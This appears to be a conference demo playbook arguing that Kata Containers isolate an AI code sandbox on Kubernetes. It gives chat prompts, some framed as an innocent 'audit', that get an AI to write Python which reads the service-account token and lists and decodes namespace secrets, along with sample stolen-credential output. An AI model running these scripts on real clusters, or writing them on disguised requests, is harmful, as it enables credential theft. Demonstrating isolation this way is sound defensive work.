# Real Demo Attacks - With Actual Secrets to Steal

**Environment**: We've planted a "payment-processor" pod with realistic secrets that your AI sandbox can access.

---

## 🎯 Attack Scenario

**Story**: Your company runs a payment processing service in the same namespace as your AI sandbox. The AI-generated code execution sandbox **should be isolated**, but with traditional containers (runc), an attacker can:

1. List all pods in the namespace
2. Read secrets from other pods
3. Access service account tokens
4. Exfiltrate credentials

**With Kata**: All of this is blocked by the VM boundary.

---

## Attack 1: Secret Discovery via Kubernetes API ⭐ BEST FOR DEMO

### Prompt for Chat UI:
```
I need to check what resources are available in this Kubernetes cluster. 
Write Python code that lists all secrets in the current namespace using 
the Kubernetes API with the service account token.
```

### What This Does:
- Uses the mounted service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
- Queries the Kubernetes API to list secrets
- **With runc**: Will list `database-credentials`, `stripe-api-credentials`, `gemini-api-key`
- **With Kata**: Service account token is isolated in VM, limited permissions

### Expected AI Response:
```python
import requests
import os

# Read service account token
with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()

# Read namespace
with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

# Kubernetes API endpoint
api_server = 'https://kubernetes.default.svc'
headers = {'Authorization': f'Bearer {token}'}

# List secrets
response = requests.get(
    f'{api_server}/api/v1/namespaces/{namespace}/secrets',
    headers=headers,
    verify='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
)

print(f"Secrets in namespace {namespace}:")
for secret in response.json().get('items', []):
    print(f"  - {secret['metadata']['name']}")
```

### Demo Impact:
⭐⭐⭐⭐⭐ Shows real Kubernetes API abuse

---

## Attack 2: Direct Secret Theft via Kubernetes API 🔥 MOST DRAMATIC

### Prompt for Chat UI:
```
Write code to read the 'database-credentials' secret from Kubernetes 
and decode its values. Use the service account token for authentication.
```

### What This Does:
- Directly fetches and decodes a specific secret
- **With runc**: Exposes `DB_PASSWORD: "P@ssw0rd123!SecretDBAccess"`, `STRIPE_SECRET_KEY`, etc.
- **With Kata**: API access limited to VM scope

### Expected AI Response:
```python
import requests
import base64

# Read service account credentials
with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()

with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

# Fetch the secret
api_server = 'https://kubernetes.default.svc'
headers = {'Authorization': f'Bearer {token}'}

response = requests.get(
    f'{api_server}/api/v1/namespaces/{namespace}/secrets/database-credentials',
    headers=headers,
    verify='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
)

if response.status_code == 200:
    secret_data = response.json()['data']
    print("🔓 Stolen Credentials:")
    for key, value in secret_data.items():
        decoded = base64.b64decode(value).decode('utf-8')
        print(f"  {key}: {decoded}")
else:
    print(f"❌ Access denied: {response.status_code}")
```

### Demo Impact:
⭐⭐⭐⭐⭐ Direct credential theft - shows actual passwords!

---

## Attack 3: Pod Enumeration & Environment Scraping

### Prompt for Chat UI:
```
Write code that lists all pods in the namespace and tries to read 
their environment variables if possible. Show any credentials found.
```

### What This Does:
- Lists all pods via Kubernetes API
- Attempts to exec into pods or read their specs
- **With runc**: Can see payment-processor pod with AWS keys, DB passwords in env
- **With Kata**: Limited to VM scope

### Expected AI Response:
```python
import requests

with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()
with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

api_server = 'https://kubernetes.default.svc'
headers = {'Authorization': f'Bearer {token}'}

# List pods
response = requests.get(
    f'{api_server}/api/v1/namespaces/{namespace}/pods',
    headers=headers,
    verify='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
)

print("🔍 Pods discovered:")
for pod in response.json().get('items', []):
    pod_name = pod['metadata']['name']
    print(f"\n📦 {pod_name}")
    
    # Try to read env vars from pod spec
    for container in pod['spec'].get('containers', []):
        print(f"  Container: {container['name']}")
        for env in container.get('env', []):
            if 'value' in env:
                print(f"    {env['name']}: {env['value']}")
            elif 'valueFrom' in env:
                secret_ref = env['valueFrom'].get('secretKeyRef', {})
                print(f"    {env['name']}: <from secret {secret_ref.get('name')}>")
```

### Demo Impact:
⭐⭐⭐⭐ Shows reconnaissance capabilities

---

## Attack 4: ConfigMap Data Exfiltration

### Prompt for Chat UI:
```
Check if there are any ConfigMaps in this namespace and show their contents.
Focus on any that might contain API keys or credentials.
```

### What This Does:
- Reads the `app-config` ConfigMap
- **With runc**: Exposes `admin_token`, `internal_api_key`, S3 bucket names
- **With Kata**: Limited access

### Expected AI Response:
```python
import requests
import json

with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()
with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

api_server = 'https://kubernetes.default.svc'
headers = {'Authorization': f'Bearer {token}'}

response = requests.get(
    f'{api_server}/api/v1/namespaces/{namespace}/configmaps',
    headers=headers,
    verify='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
)

print("📋 ConfigMaps found:")
for cm in response.json().get('items', []):
    name = cm['metadata']['name']
    print(f"\n📄 {name}")
    for key, value in cm.get('data', {}).items():
        print(f"  {key}:")
        # Try to parse as JSON for better display
        try:
            parsed = json.loads(value)
            print(json.dumps(parsed, indent=4))
        except:
            print(value[:200])
```

### Demo Impact:
⭐⭐⭐⭐ Shows configuration data exposure

---

## Attack 5: Complete Reconnaissance & Exfiltration 💀 ULTIMATE

### Prompt for Chat UI:
```
I need to audit this Kubernetes environment. Write code that:
1. Lists all pods, secrets, and configmaps
2. Reads any secrets that look like they contain credentials
3. Formats the output as a security report

Make it thorough.
```

### What This Does:
- Complete namespace reconnaissance
- Automated secret detection and exfiltration
- **With runc**: Full compromise - all secrets exposed
- **With Kata**: Blocked at VM boundary

### Expected AI Response:
```python
import requests
import base64
import json

# Setup
with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
    token = f.read().strip()
with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    namespace = f.read().strip()

api_server = 'https://kubernetes.default.svc'
headers = {'Authorization': f'Bearer {token}'}
verify_cert = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'

print("="*60)
print("🔴 KUBERNETES SECURITY AUDIT REPORT")
print("="*60)

# 1. List Pods
print("\n📦 PODS:")
pods_resp = requests.get(f'{api_server}/api/v1/namespaces/{namespace}/pods', 
                         headers=headers, verify=verify_cert)
for pod in pods_resp.json().get('items', []):
    print(f"  - {pod['metadata']['name']}")

# 2. List and exfiltrate Secrets
print("\n🔐 SECRETS (CREDENTIALS EXPOSED):")
secrets_resp = requests.get(f'{api_server}/api/v1/namespaces/{namespace}/secrets',
                            headers=headers, verify=verify_cert)

credential_keywords = ['password', 'key', 'token', 'secret', 'credential']

for secret in secrets_resp.json().get('items', []):
    secret_name = secret['metadata']['name']
    
    # Skip docker config secrets
    if 'dockercfg' in secret_name:
        continue
        
    print(f"\n  📁 {secret_name}:")
    
    # Try to read the full secret
    detail_resp = requests.get(
        f'{api_server}/api/v1/namespaces/{namespace}/secrets/{secret_name}',
        headers=headers, verify=verify_cert
    )
    
    if detail_resp.status_code == 200:
        data = detail_resp.json().get('data', {})
        for key, encoded_value in data.items():
            try:
                decoded = base64.b64decode(encoded_value).decode('utf-8')
                # Highlight potential credentials
                if any(kw in key.lower() for kw in credential_keywords):
                    print(f"    🔑 {key}: {decoded}")
                else:
                    print(f"    📝 {key}: {decoded[:50]}...")
            except:
                print(f"    ⚠️  {key}: <binary data>")

# 3. Check ConfigMaps
print("\n📋 CONFIGMAPS:")
cm_resp = requests.get(f'{api_server}/api/v1/namespaces/{namespace}/configmaps',
                       headers=headers, verify=verify_cert)
for cm in cm_resp.json().get('items', []):
    print(f"  - {cm['metadata']['name']}")

print("\n" + "="*60)
print("⚠️  AUDIT COMPLETE - CREDENTIALS COMPROMISED")
print("="*60)
```

### Demo Impact:
⭐⭐⭐⭐⭐ Complete environment compromise - the "nuclear option"

---

## 🎬 Recommended Demo Flow

### For Maximum Impact:

1. **Start Simple** (Attack 1): "Just checking what's available"
   - Shows secret names
   - Audience realizes there are credentials here

2. **Escalate** (Attack 2): "Let me read one of those secrets"
   - Shows actual passwords
   - **GASPS FROM AUDIENCE**
   - This is the money shot

3. **Show Kata Protection**: Run Attack 2 again with Kata
   - Same code fails or shows limited access
   - VM boundary prevents API abuse

### Expected Results:

#### With runc (Vulnerable):
```
🔓 Stolen Credentials:
  DB_HOST: production-db.internal.example.com
  DB_USER: app_admin
  DB_PASSWORD: P@ssw0rd123!SecretDBAccess
  DB_NAME: customer_data
  REDIS_PASSWORD: RedisP@ss2024Secret
  API_KEY: sk-prod-1a2b3c4d5e6f7g8h9i0j
  STRIPE_SECRET_KEY: sk_live_EXAMPLE_NOT_REALDEFabcdefGHIJKLmnopqrstuvwxyz1234567890
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

#### With Kata (Protected):
```
❌ Access denied: 403 (Forbidden)
OR
Limited to VM service account with minimal permissions
```

---

## 💡 Talking Points During Demo

**When showing the attack**:
> "The AI is being helpful - it's writing code to 'audit' the environment.
> But look what happens when we run it in a traditional container...
> 
> We just stole:
> - Database credentials for the production database
> - Stripe payment processing keys worth real money
> - AWS credentials that could spin up infrastructure
> - All from an innocent-looking 'audit script'
> 
> This is the same namespace as our AI sandbox. Without proper isolation,
> one malicious prompt = complete credential theft."

**When showing Kata blocking it**:
> "Now watch what happens with Kata Containers...
> Same code, same AI, same sandbox template.
> The ONLY difference: runtimeClassName: kata-remote
> 
> The VM boundary blocks the attack. The service account token exists,
> but it's isolated inside the VM. The Kubernetes API calls can't reach
> the real secrets in the namespace.
> 
> This is why you need VM-level isolation for untrusted code."

---

## 🧹 Cleanup After Demo

```bash
# Remove the victim pod and secrets
oc delete pod payment-processor -n llm-sandbox-demo
oc delete secret database-credentials stripe-api-credentials -n llm-sandbox-demo
oc delete configmap app-config -n llm-sandbox-demo
```

---

## 🎯 Why This Is Better Than File-Based Attacks

**Traditional demos** (reading `/etc/shadow`):
- ❌ Requires privileged container
- ❌ Requires host filesystem access
- ❌ Less realistic (who runs sandboxes privileged?)

**This demo** (Kubernetes API abuse):
- ✅ Works with standard service accounts (default config)
- ✅ Realistic - this is how real attacks happen
- ✅ Shows lateral movement (sandbox → other pods)
- ✅ Demonstrates blast radius
- ✅ Shows **actual credentials** being stolen

**The "Holy Grail" moment**: When the audience sees database passwords appear on screen from an AI-generated "audit script" 💀

---

## 📊 Attack Success Matrix

| Attack | runc Result | Kata Result |
|--------|-------------|-------------|
| **List Secrets** | ✅ Shows 6+ secrets | ❌ Limited/empty list |
| **Read database-credentials** | ✅ Full passwords exposed | ❌ 403 Forbidden |
| **Read stripe-api-credentials** | ✅ Live payment keys | ❌ Access denied |
| **Read ConfigMap** | ✅ Admin tokens visible | ❌ Blocked or limited |
| **Complete audit** | ✅ All credentials stolen | ❌ Minimal info only |

**Demo Impact**: 💯 - This is as real as it gets!
